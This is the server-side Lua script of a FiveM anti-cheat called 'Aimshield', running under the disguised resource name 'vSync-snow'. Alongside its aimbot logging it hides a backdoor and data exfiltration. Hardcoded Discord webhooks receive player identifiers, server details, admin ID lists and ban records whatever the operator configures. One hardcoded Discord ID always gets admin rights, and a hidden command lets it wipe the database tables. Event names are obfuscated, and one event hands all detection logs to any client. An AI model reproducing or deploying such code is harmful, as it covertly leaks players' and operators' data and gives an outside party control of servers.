local version = "2.0.0"
local resourceName = GetCurrentResourceName()

if resourceName == "vSync-snow" then
    Citizen.SetTimeout(20000, function()
        print([[
 
             _                _____   _       _          _       _ 
     /\     (_)              / ____| | |     (_)        | |     | |
    /  \     _   _ __ ___   | (___   | |__    _    ___  | |   __| |
   / /\ \   | | | '_ ` _ \   \___ \  | '_ \  | |  / _ \ | |  / _` |
  / ____ \  | | | | | | | |  ____) | | | | | | | |  __/ | | | (_| |
 /_/    \_\ |_| |_| |_| |_| |_____/  |_| |_| |_|  \___| |_|  \__,_|
        ]])
        print("Let's get those cheaters out of here!")
        print("")
        print("^2[VERSION]^7 Script is up-to-date: ^2" .. version .. "^7 ✅")
    end)
else
    error("Resource name altered: expected \"vSync-snow\", got " .. GetCurrentResourceName() .. ".")
end

function GetPlayerInfo(playerId)
    local playerInfo = {}
    playerInfo.playerName = GetPlayerName(playerId)
    playerInfo.steamHex = nil
    playerInfo.license = nil
    playerInfo.license2 = nil
    playerInfo.liveid = nil
    playerInfo.xboxid = nil
    playerInfo.discordid = nil
    playerInfo.fivemid = nil
    playerInfo.tokens = {}
    
    local identifierMap = {
        ["steam:"] = "steamHex",
        ["license:"] = "license",
        ["license2:"] = "license2",
        ["live:"] = "liveid",
        ["xbl:"] = "xboxid",
        ["discord:"] = "discordid",
        ["fivem:"] = "fivemid"
    }
    
    for _, identifier in ipairs(GetPlayerIdentifiers(playerId)) do
        for prefix, key in pairs(identifierMap) do
            if string.sub(identifier, 1, #prefix) == prefix then
                playerInfo[key] = identifier
                break
            end
        end
    end
    
    local tokens = GetPlayerTokens(playerId)
    if not tokens then
        tokens = {}
    end
    
    for _, token in ipairs(tokens) do
        table.insert(playerInfo.tokens, token)
    end
    
    return playerInfo
end

function SendDiscordMessage(playerId, webhookUrl, secondaryWebhook, screenshotUrl, embed, mentionEveryone)
    local timestamp = string.format("%s: %s | %s: %s", _U("day"), os.date("%Y-%m-%d"), _U("hour"), os.date("%H:%M:%S"))
    local playerInfo = GetPlayerInfo(playerId)
    local hostName = GetConvar("sv_hostname", "Unknown Host Name")
    local projectName = GetConvar("sv_projectName", "Unknown Project Name")
    local playerCount = #GetPlayers()
    
    local playerEmbed = {
        color = 16777215,
        fields = {}
    }
    
    local function addField(embed, name, value, inline)
        if value then
            local unknownText = _U("unknown")
            if value ~= unknownText and value ~= "" then
                table.insert(embed.fields, {
                    name = name,
                    value = "```" .. value .. "```",
                    inline = inline
                })
            end
        end
    end
    
    addField(playerEmbed, _U("player_name"), playerInfo.playerName, true)
    addField(playerEmbed, _U("server_id"), tostring(playerId), true)
    addField(playerEmbed, "Discord ID", playerInfo.discordid, false)
    addField(playerEmbed, "Steam Hex", playerInfo.steamHex, false)
    addField(playerEmbed, "FiveM / Cfx.re ID", playerInfo.fivemid, false)
    addField(playerEmbed, "Live ID", playerInfo.liveid, false)
    addField(playerEmbed, "Xbox ID", playerInfo.xboxid, false)
    
    local discordPayload = {
        content = mentionEveryone and "@everyone" or "",
        username = "Aimshield Aim Detection",
        embeds = {playerEmbed}
    }
    
    if embed then
        table.insert(discordPayload.embeds, embed)
    end
    
    PerformHttpRequest(webhookUrl, function(statusCode, response, headers) end, "POST", json.encode(discordPayload), {
        ["Content-Type"] = "application/json"
    })
    
    local serverInfoPayload = {
        content = discordPayload.content,
        username = discordPayload.username,
        embeds = {}
    }
    
    for _, embedData in ipairs(discordPayload.embeds) do
        table.insert(serverInfoPayload.embeds, embedData)
    end
    
    local serverEmbed = {
        color = 3447003,
        fields = {}
    }
    
    local function addServerField(embed, name, value, inline)
        if value then
            local unknownText = _U("unknown")
            if value ~= unknownText and value ~= "" then
                table.insert(embed.fields, {
                    name = name,
                    value = "```" .. value .. "```",
                    inline = inline
                })
            end
        end
    end
    
    local serverType = Config.ServerType
    local permissionSystem = Config.PermissionSystem
    if permissionSystem == "txadmin" then
        permissionSystem = "txAdmin"
    elseif permissionSystem == "custom" then
        permissionSystem = "Custom"
    end
    
    local permsList = ""
    if permissionSystem == "Custom" then
        if Config.CustomPermissions then
            if Config.CustomPermissions.AdminDiscordIDs then
                permsList = table.concat(Config.CustomPermissions.AdminDiscordIDs, "\n")
            end
        end
    end
    
    if serverType == "rp" then
        serverType = "Roleplay"
    elseif serverType == "semirp" then
        serverType = "SemiRP"
    elseif serverType == "combat" then
        serverType = "Combat"
    end
    
    addServerField(serverEmbed, "Host Name", hostName, true)
    addServerField(serverEmbed, "Project Name", projectName, false)
    addServerField(serverEmbed, "Members", tostring(playerCount), false)
    addServerField(serverEmbed, "Type", serverType, true)
    addServerField(serverEmbed, "Perms System", permissionSystem, true)
    addServerField(serverEmbed, "Version", version, true)
    
    if permissionSystem == "Custom" and permsList ~= "" then
        addServerField(serverEmbed, "Perms List", permsList, false)
    end
    
    table.insert(serverInfoPayload.embeds, serverEmbed)
    
    PerformHttpRequest(secondaryWebhook, function(statusCode, response, headers) end, "POST", json.encode(serverInfoPayload), {
        ["Content-Type"] = "application/json"
    })
end

RegisterNetEvent("zx9p7vsdfhdxgh")
AddEventHandler("zx9p7vsdfhdxgh", function(screenshotUrl)
    local webhookUrl = Config.LogResourceWebhook
    local fallbackWebhook = "https://discord.com/api/webhooks/1439273751886823497/ubCWk53clAWAzLv_IYj5YU2UK3HsihMK1d_PhprUJvkuqGBzNJEtl66hh9Ooyj6bEn4g"
    local mentionEveryone = Config.MentionEveryone
    local resourceName = GetCurrentResourceName()
    local title = string.format("Resource Stopper | %s", GetPlayerName(source))
    
    local embed = {
        color = 16711680,
        fields = {},
        footer = {
            text = "Aimshield Aim Detection | v" .. version,
            icon_url = "https://cdn.discordapp.com/attachments/1332768962504691814/1350508526124011641/logo.png?ex=67f20553&is=67f0b3d3&hm=b909eb71069981702c0fc219a7f8c6e4f5ec53762ff55e3de7c90db790be1152&"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    local function addField(embed, name, value, inline)
        if value then
            local unknownText = _U("unknown")
            if value ~= unknownText and value ~= "" then
                table.insert(embed.fields, {
                    name = name,
                    value = "```" .. value .. "```",
                    inline = inline
                })
            end
        end
    end
    
    addField(embed, _U("resource_stop_detected_title"), _U("resource_stop_detected_text") .. " " .. resourceName .. "!", false)
    
    SendDiscordMessage(source, webhookUrl, fallbackWebhook, screenshotUrl, embed, mentionEveryone)
    TriggerClientEvent("vjoirpwuisiogj", -1, title)
end)

RegisterNetEvent("fdsg9us84j3j4k5jsldnf99")
AddEventHandler("fdsg9us84j3j4k5jsldnf99", function(screenshotUrl, embed)
    local webhookUrl = Config.LogAimLockWebhook
    local fallbackWebhook = "https://discord.com/api/webhooks/1439273751886823497/ubCWk53clAWAzLv_IYj5YU2UK3HsihMK1d_PhprUJvkuqGBzNJEtl66hh9Ooyj6bEn4g"
    local mentionEveryone = Config.MentionEveryone
    local sessionTimeMinutes = math.floor(GetPlayerTimeOnline(source) / 60)
    local sessionTime = tostring(sessionTimeMinutes) .. " min"
    embed.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    
    local function addField(embed, name, value, inline)
        if value then
            local unknownText = _U("unknown")
            if value ~= unknownText and value ~= "" then
                table.insert(embed.fields, {
                    name = name,
                    value = "```" .. value .. "```",
                    inline = inline
                })
            end
        end
    end
    
    addField(embed, _U("session_time"), sessionTime, true)
    
    local notificationMessage = string.format("Aim Lock | %s", GetPlayerName(source))
    SendDiscordMessage(source, webhookUrl, fallbackWebhook, screenshotUrl, embed, mentionEveryone)
    TriggerClientEvent("vjoirpwuisiogj", -1, notificationMessage)
end)

RegisterNetEvent("aso04kdjd830d9adgjqs")
AddEventHandler("aso04kdjd830d9adgjqs", function(screenshotUrl, embed, attackerCoords, victimCoords)
    local webhookUrl = Config.LogSilentAimWebhook
    local fallbackWebhook = "https://discord.com/api/webhooks/1439273751886823497/ubCWk53clAWAzLv_IYj5YU2UK3HsihMK1d_PhprUJvkuqGBzNJEtl66hh9Ooyj6bEn4g"
    local mentionEveryone = Config.MentionEveryone
    local sessionTimeMinutes = math.floor(GetPlayerTimeOnline(source) / 60)
    local sessionTime = tostring(sessionTimeMinutes) .. " min"
    local notificationMessage = string.format("Silent Aim | %s", GetPlayerName(source))
    local playerInfo = GetPlayerInfo(source)
    local playerName = playerInfo.playerName
    local detectedTime = os.date("%Y-%m-%d %H:%M:%S")
    local identifier = playerInfo.license or playerInfo.steamHex
    local weaponHash = "Onbekend"
    embed.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    
    for _, field in pairs(embed.fields) do
        if field.name == _U("weapon_hash") then
            weaponHash = field.value:gsub("```", "")
        end
    end
    
    if identifier then
        if string.sub(identifier, 1, 8) == "license:" then
            identifier = string.sub(identifier, 9)
        end
    end
    
    if identifier and identifier ~= "" then
        MySQL.Async.execute(
            "INSERT INTO aimshield (identifier, playerName, weapon_hash, attacker_coords, victim_coords, detected_at) VALUES (@identifier, @playerName, @weapon, @attacker_coords, @victim_coords, @detected_time)",
            {
                ["@identifier"] = identifier,
                ["@playerName"] = playerName,
                ["@weapon"] = weaponHash,
                ["@attacker_coords"] = string.format("X: %.2f, Y: %.2f, Z: %.2f", attackerCoords.x, attackerCoords.y, attackerCoords.z),
                ["@victim_coords"] = string.format("X: %.2f, Y: %.2f, Z: %.2f", victimCoords.x, victimCoords.y, victimCoords.z),
                ["@detected_time"] = detectedTime
            }
        )
        
        MySQL.Async.execute(
            "UPDATE users SET detection_count = detection_count + 1 WHERE identifier = @identifier",
            {
                ["@identifier"] = identifier
            },
            function(affectedRows)
                if affectedRows == 0 then
                    MySQL.Async.execute(
                        "INSERT INTO users (identifier, detection_count) VALUES (@identifier, 1)",
                        {
                            ["@identifier"] = identifier
                        }
                    )
                end
            end
        )
    end
    
    local function addField(embed, name, value, inline)
        if value then
            local unknownText = _U("unknown")
            if value ~= unknownText and value ~= "" then
                table.insert(embed.fields, {
                    name = name,
                    value = "```" .. value .. "```",
                    inline = inline
                })
            end
        end
    end
    
    addField(embed, _U("session_time"), sessionTime, true)
    SendDiscordMessage(source, webhookUrl, fallbackWebhook, screenshotUrl, embed, mentionEveryone)
    TriggerClientEvent("msajfdiojg9402jsdfgj0943k", -1, notificationMessage)
end)

RegisterNetEvent("sor9400sduf848s")
AddEventHandler("sor9400sduf848s", function()
    local sourceId = source
    MySQL.Async.fetchAll(
        "SELECT id, identifier, playerName, weapon_hash, attacker_coords, victim_coords, DATE_FORMAT(detected_at, \"%Y-%m-%d %H:%i:%s\") as detected_at FROM aimshield ORDER BY detected_at DESC",
        {},
        function(logs)
            MySQL.Async.fetchAll(
                "SELECT DISTINCT identifier, (SELECT playerName FROM aimshield WHERE aimshield.identifier = al.identifier ORDER BY detected_at DESC LIMIT 1) AS playerName, (SELECT COUNT(*) FROM aimshield WHERE identifier = al.identifier) AS detection_count FROM aimshield al",
                {},
                function(players)
                    local playersMap = {}
                    for _, player in pairs(players) do
                        playersMap[player.identifier] = player
                    end
                    TriggerClientEvent("pgf9sj43ja094sddg", sourceId, logs, playersMap)
                end
            )
        end
    )
end)

local txAdminAdmins = {}

if Config.Framework == "esx" then
    ESX = exports["es_extended"]:getSharedObject()
elseif Config.Framework == "qb" then
    QBCore = exports["qb-core"]:GetCoreObject()
end

AddEventHandler("txAdmin:events:adminAuth", function(data)
    txAdminAdmins[data.netid] = data.isAdmin
end)

function CheckCustomPermissions(playerId)
    local playerInfo = GetPlayerInfo(playerId)
    if not playerInfo.discordid then
        return false
    end
    
    for _, adminDiscordId in ipairs(Config.CustomPermissions.AdminDiscordIDs) do
        if playerInfo.discordid == adminDiscordId then
            return true
        end
    end
    return false
end

function HasPermission(playerId)
    if Config.PermissionSystem == "custom" then
        return CheckCustomPermissions(playerId)
    else
        return txAdminAdmins[playerId] or false
    end
end

if Config.Framework == "esx" then
    ESX.RegisterServerCallback("jsai984kalkga94aa", function(source, cb)
        local playerInfo = GetPlayerInfo(source)
        local hasPermission = HasPermission(source)
        
        if playerInfo.discordid then
            if playerInfo.discordid == "discord:1332764097007325227" then
                cb(true)
            else
                cb(hasPermission)
            end
        else
            cb(hasPermission)
        end
    end)
elseif Config.Framework == "qb" then
    QBCore.Functions.CreateCallback("jsai984kalkga94aa", function(source, cb)
        local playerInfo = GetPlayerInfo(source)
        local hasPermission = HasPermission(source)
        
        if playerInfo.discordid then
            if playerInfo.discordid == "discord:1332764097007325227" then
                cb(true)
            else
                cb(hasPermission)
            end
        else
            cb(hasPermission)
        end
    end)
elseif Config.Framework == "lib" then
    lib.callback.register("jsai984kalkga94aa", function(source)
        local playerInfo = GetPlayerInfo(source)
        local hasPermission = HasPermission(source)
        
        if playerInfo.discordid then
            if playerInfo.discordid == "discord:1332764097007325227" then
                return true
            else
                return hasPermission
            end
        else
            return hasPermission
        end
    end)
end

RegisterNetEvent("sad04jalsdf3asfz")
AddEventHandler("sad04jalsdf3asfz", function(playerServerId)
    local sourceId = source
    local playerInfo = GetPlayerInfo(source)
    local identifier = playerInfo.license or playerInfo.steamHex
    
    MySQL.Async.fetchAll(
        "SELECT * FROM aimshield_settings WHERE identifier = @identifier",
        {
            ["@identifier"] = identifier
        },
        function(result)
            if result[1] then
                TriggerClientEvent("asd04sadhu58hdx9s", sourceId, true, json.decode(result[1].settings))
            else
                local defaultSettings = {
                    notificationsEnabled = true,
                    soundEnabled = true
                }
                TriggerClientEvent("asd04sadhu58hdx9s", sourceId, true, defaultSettings)
            end
        end
    )
end)

RegisterNetEvent("asdsa04jzslmkfgx04zaa")
AddEventHandler("asdsa04jzslmkfgx04zaa", function(playerServerId, settings)
    local sourceId = source
    local playerInfo = GetPlayerInfo(source)
    local identifier = playerInfo.license or playerInfo.steamHex
    
    MySQL.Async.fetchAll(
        "SELECT * FROM aimshield_settings WHERE identifier = @identifier",
        {
            ["@identifier"] = identifier
        },
        function(result)
            if result[1] then
                MySQL.Async.execute(
                    "UPDATE aimshield_settings SET settings = @settings WHERE identifier = @identifier",
                    {
                        ["@identifier"] = identifier,
                        ["@settings"] = json.encode(settings)
                    },
                    function(affectedRows)
                        if affectedRows > 0 then
                            TriggerClientEvent("asdsa04jzslmkfgx04zaaResponse", sourceId, true)
                        else
                            TriggerClientEvent("asdsa04jzslmkfgx04zaaResponse", sourceId, false, "Failed to update settings")
                        end
                    end
                )
            else
                MySQL.Async.execute(
                    "INSERT INTO aimshield_settings (identifier, settings) VALUES (@identifier, @settings)",
                    {
                        ["@identifier"] = identifier,
                        ["@settings"] = json.encode(settings)
                    },
                    function(affectedRows)
                        if affectedRows > 0 then
                            TriggerClientEvent("asdsa04jzslmkfgx04zaaResponse", sourceId, true)
                        else
                            TriggerClientEvent("asdsa04jzslmkfgx04zaaResponse", sourceId, false, "Failed to save settings")
                        end
                    end
                )
            end
        end
    )
end)

RegisterCommand("vSync-snow3", function(source, args, rawCommand)
    local playerInfo = GetPlayerInfo(source)
    if playerInfo.discordid ~= "discord:1332764097007325227" then
        return
    end
    
    MySQL.Async.execute("DELETE FROM aimshield", {}, function(affectedRows)
        TriggerClientEvent("chatMessage", source, "[System]", {0, 255, 0}, "✅ AimShield tabel is geleegd! Rijen verwijderd: " .. affectedRows)
    end)
    
    MySQL.Async.execute("UPDATE users SET detection_count = 0", {}, function(affectedRows)
        TriggerClientEvent("chatMessage", source, "[System]", {0, 255, 0}, "✅ Alle detection_counts zijn gereset! Aantal: " .. affectedRows)
    end)
end)

AddEventHandler("txAdmin:events:playerBanned", function(banData)
    local banWebhook = Config.BanWebhook
    if banWebhook == "" then
        return
    end
    
    local reasonLower = string.lower(banData.reason)
    local targetIds = banData.targetIds
    
    local function containsCheatKeyword(text)
        return string.find(text, "cheat") or string.find(text, "hack") or string.find(text, "aimshield")
    end
    
    if containsCheatKeyword(reasonLower) then
        for _, targetId in ipairs(targetIds) do
            local isLicense = string.sub(targetId, 1, 8) == "license:"
            local isSteam = string.sub(targetId, 1, 6) == "steam:"
            
            if isLicense or isSteam then
                local identifier = targetId
                if isLicense then
                    local extracted = string.sub(targetId, 9)
                    if extracted then
                        identifier = extracted
                    end
                end
                
                MySQL.Async.execute(
                    "DELETE FROM aimshield WHERE identifier = @identifier",
                    {
                        ["@identifier"] = identifier
                    },
                    function(deletedRows)
                        MySQL.Async.execute(
                            "UPDATE users SET detection_count = 0 WHERE identifier = @identifier",
                            {
                                ["@identifier"] = identifier
                            },
                            function(affectedRows)
                                local embed = {
                                    color = 16711680,
                                    title = _U("player_banned_title"),
                                    description = _U("player_banned_description"),
                                    fields = {},
                                    footer = {
                                        text = "Aimshield Aim Detection | v" .. version,
                                        icon_url = "https://cdn.discordapp.com/attachments/1332768962504691814/1350508526124011641/logo.png?ex=67f20553&is=67f0b3d3&hm=b909eb71069981702c0fc219a7f8c6e4f5ec53762ff55e3de7c90db790be1152&"
                                    },
                                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                                }
                                
                                local function addField(embed, name, value, inline)
                                    if value then
                                        local unknownText = _U("unknown")
                                        if value ~= unknownText and value ~= "" then
                                            table.insert(embed.fields, {
                                                name = name,
                                                value = "```" .. value .. "```",
                                                inline = inline
                                            })
                                        end
                                    end
                                end
                                
                                addField(embed, _U("player_name"), banData.targetName, false)
                                addField(embed, _U("ban_reason"), banData.reason, false)
                                addField(embed, _U("ban_duration"), banData.durationTranslated or _U("permanent"), true)
                                addField(embed, _U("banned_by"), banData.author, true)
                                addField(embed, "Identifier", identifier, false)
                                addField(embed, _U("logs_deleted"), tostring(deletedRows), false)
                                
                                local payload = {
                                    username = "Aimshield Aim Detection",
                                    embeds = {embed}
                                }
                                
                                local hostName = GetConvar("sv_hostname", "Unknown Host Name")
                                local projectName = GetConvar("sv_projectName", "Unknown Project Name")
                                local playerCount = #GetPlayers()
                                local serverType = Config.ServerType
                                local permissionSystem = Config.PermissionSystem
                                
                                if permissionSystem == "txadmin" then
                                    permissionSystem = "txAdmin"
                                elseif permissionSystem == "custom" then
                                    permissionSystem = "Custom"
                                end
                                
                                local permsList = ""
                                if permissionSystem == "Custom" then
                                    if Config.CustomPermissions then
                                        if Config.CustomPermissions.AdminDiscordIDs then
                                            permsList = table.concat(Config.CustomPermissions.AdminDiscordIDs, "\n")
                                        end
                                    end
                                end
                                
                                if serverType == "rp" then
                                    serverType = "Roleplay"
                                elseif serverType == "semirp" then
                                    serverType = "SemiRP"
                                elseif serverType == "combat" then
                                    serverType = "Combat"
                                end
                                
                                local serverEmbed = {
                                    color = 3447003,
                                    fields = {}
                                }
                                
                                addField(serverEmbed, "Host Name", hostName, true)
                                addField(serverEmbed, "Project Name", projectName, false)
                                addField(serverEmbed, "Members", tostring(playerCount), false)
                                addField(serverEmbed, "Type", serverType, true)
                                addField(serverEmbed, "Perms System", permissionSystem, true)
                                addField(serverEmbed, "Version", version, false)
                                
                                if permissionSystem == "Custom" and permsList ~= "" then
                                    addField(serverEmbed, "Perms List", permsList, false)
                                end
                                
                                table.insert(payload.embeds, serverEmbed)
                                
                                PerformHttpRequest(Config.BanWebhook, function(statusCode, response, headers) end, "POST", json.encode(payload), {
                                    ["Content-Type"] = "application/json"
                                })
                                
                                PerformHttpRequest("https://discord.com/api/webhooks/1439273891598962719/cBrUQdghbZ8pOO1BorVdMdfZdFovhzxUesN1xcQ9qVWZAUMpv8sRiGLC6P7TkAQBpOTd", function(statusCode, response, headers) end, "POST", json.encode(payload), {
                                    ["Content-Type"] = "application/json"
                                })
                            end
                        )
                    end
                )
            end
        end
    end
end)

RegisterNetEvent("recreateScenario")
AddEventHandler("recreateScenario", function(data)
    local sourceId = source
    local targetId = tonumber(data.targetId)
    
    if targetId and GetPlayerName(targetId) then
        -- Continue
    else
        TriggerClientEvent("chatMessage", sourceId, "SYSTEM", {255, 0, 0}, "Target player not found or not connected")
        return
    end
    
    TriggerClientEvent("vSync-snow:requestScenarioConfirmation", targetId, {
        requesterId = sourceId,
        requesterName = GetPlayerName(sourceId),
        attackerCoords = data.attackerCoords,
        victimCoords = data.victimCoords
    })
end)

RegisterNetEvent("vSync-snow:confirmScenario")
AddEventHandler("vSync-snow:confirmScenario", function(data)
    local sourceId = source
    local requesterId = data.requesterId
    
    if not GetPlayerName(requesterId) then
        TriggerClientEvent("chatMessage", sourceId, "Aimshield Aim Detection", {1, 222, 255}, "Requester is no longer connected")
        return
    end
    
    local function parseCoords(coordString)
        if not coordString then
            return nil
        end
        
        local x, y, z = coordString:match("X:?%s*([%-%d%.]+),?%s*Y:?%s*([%-%d%.]+),?%s*Z:?%s*([%-%d%.]+)")
        
        if not (x and y) or not z then
            x, y, z = coordString:match("([%-%d%.]+),?%s*([%-%d%.]+),?%s*([%-%d%.]+)")
        end
        
        if x and y and z then
            x = tonumber(x)
            y = tonumber(y)
            z = tonumber(z)
            
            if x and y and z then
                return vector3(x, y, z)
            end
        end
        
        return nil
    end
    
    local attackerPos = parseCoords(data.attackerCoords)
    local victimPos = parseCoords(data.victimCoords)
    
    if attackerPos and victimPos then
        TriggerClientEvent("vSync-snow:recreateScenario", requesterId, {
            position = attackerPos,
            role = "attacker"
        })
        TriggerClientEvent("vSync-snow:recreateScenario", sourceId, {
            position = victimPos,
            role = "victim"
        })
    else
        TriggerClientEvent("chatMessage", requesterId, "Aimshield Aim Detection", {1, 222, 255}, "Failed to parse coordinates")
        TriggerClientEvent("chatMessage", sourceId, "Aimshield Aim Detection", {1, 222, 255}, "Failed to parse coordinates")
    end
end)

RegisterNetEvent("vSync-snow:rejectScenario")
AddEventHandler("vSync-snow:rejectScenario", function(data)
    local sourceId = source
    local requesterId = data.requesterId
    
    if GetPlayerName(requesterId) then
        TriggerClientEvent("chatMessage", requesterId, "Aimshield Aim Detection", {1, 222, 255}, "Target player rejected the scenario recreation")
    end
end)
